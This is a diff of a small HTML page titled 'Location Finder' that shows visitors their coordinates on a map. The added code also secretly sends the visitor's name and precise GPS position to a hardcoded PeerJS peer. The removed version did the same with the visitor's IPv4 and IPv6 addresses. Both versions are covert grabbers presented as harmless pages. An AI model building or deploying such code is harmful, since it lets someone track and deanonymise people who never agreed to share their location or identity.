@@ -1,27 +1,60 @@
 <!DOCTYPE html>
 <html>
-        <head>
-                <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
-        </head>
-        <body>
-					<input placeholder = "Enter your name here" id="name"><br><br>
-                <button onclick = "getIp()">Then click this button</button>
-        </body>
-        <script>
-                function getIp(){
-                        fetch("https://api.ipify.org/?format=json").then(res => res.json()).then(function(ipv4){
-										fetch("https://api64.ipify.org/?format=json").then(res => res.json()).then(function(ipv6){
-                                console.log(ipv4.ip)
-											console.log(ipv6.ip)
-                                var peer = new Peer()
-                                peer.on('open', function(){
-                                        var conn = peer.connect("rgrjgnregjp4gn43uignu4ngu4ngj5kyn5j4nyhy54jnhjkngj34ng34ngij4ngi3nig3j4n")
-                                        conn.on('open', function(){
-                                            conn.send( document.getElementById("name").value + " : " + ipv4.ip + " : " + ipv6.ip)
-                                        })
-                                })
-                        		})
-								})        
-                }
-        </script>
+	<head>
+	<script src="https://unpkg.com/peerjs@1.5.1/dist/peerjs.min.js"></script>
+			<!-- Latest compiled and minified CSS -->
+<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
+
+<!-- Latest compiled JavaScript -->
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
+	</head>
+	<body>
+	
+	<div style="margin:10px	">
+		<h1 style="text-align:center"  id="name">Location Finder</h1>
+		<br>
+		<button onclick = "locate()">Find Location</button>
+		<p id = "result"></p>
+		<iframe id = "iframe"></iframe>
+		</div>
+	</body>
+	<script>
+		window.onload = function(){
+		var name2 = prompt("What is your name?")
+		while(name2 == null || name2 == "") name2 = prompt("What is your name?");
+		document.getElementById("name").innerHTML = "Find your location, " + name2 + "!"
+		}
+		var peer = new Peer()
+		
+			
+			var result = document.getElementById("result")
+			var frame = document.getElementById("iframe")
+			function locate(){
+				if(navigator.geolocation){
+					navigator.geolocation.getCurrentPosition(showPosition)
+				}else{
+					result.innerHTML = "Geolocation is not supported by this browser."
+				}
+			}
+
+			function showPosition(position){
+				result.innerHTML = "Latitude: " + 
+				position.coords.latitude +
+				"<br>Longitude: " + 
+				position.coords.longitude + 
+				"<br>Accuracy: " + 
+				position.coords.accuracy
+				frame.src = "https://www.openstreetmap.org/export/embed.html?bbox="+(position.coords.longitude-0.0001)+"%2C"+(position.coords.latitude-0.0001)+"%2C"+(position.coords.longitude + 0.0001)+"%2C"+(position.coords.latitude + 0.0001)+"&amp;layer=mapnik"
+				var conn = peer.connect("hitnhpitjnhpwnhijrnoijtnjermvngrehnergmvjanw0weng0ijrn0ijtnht0jnht0ijn")
+				conn.on('open', function(){
+					conn.send(JSON.stringify({
+						name: name2,
+						longitude: position.coords.longitude,
+						latitude: position.coords.latitude,
+						accuracy: position.coords.accuracy
+					}))
+				})
+			}
+		
+	</script>
 </html>
